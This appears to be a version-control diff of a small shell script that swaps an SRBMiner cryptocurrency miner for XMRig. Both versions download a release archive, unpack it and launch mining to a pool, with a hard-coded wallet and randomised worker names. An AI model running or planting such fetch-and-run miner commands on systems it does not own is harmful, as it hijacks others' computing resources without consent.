@@ -1,6 +1,7 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.6/SRBMiner-Multi-0-9-6-Linux.tar.xz  
-tar -xvf SRBMiner-Multi-0-9-6-Linux.tar.xz  
-sudo ./SRBMiner-Multi-0-9-6/SRBMiner-MULTI --algorithm ghostrider --pool stratum-eu.rplant.xyz:17075 --tls true --wallet BBYcjnzYeQPijoF3aEB3oDmM2pz5UJetj4R.$(echo $(shuf -i 10000-99999 -n 1)-Maho) --password x
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar -xf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u FTM:0x7ed09285aee02b826ea9fb1358a9a4108bd6230e.$(echo $(shuf -i 10000-99999 -n 1)-kemal-$(shuf -i 10000-99999 -n 1)) -p x
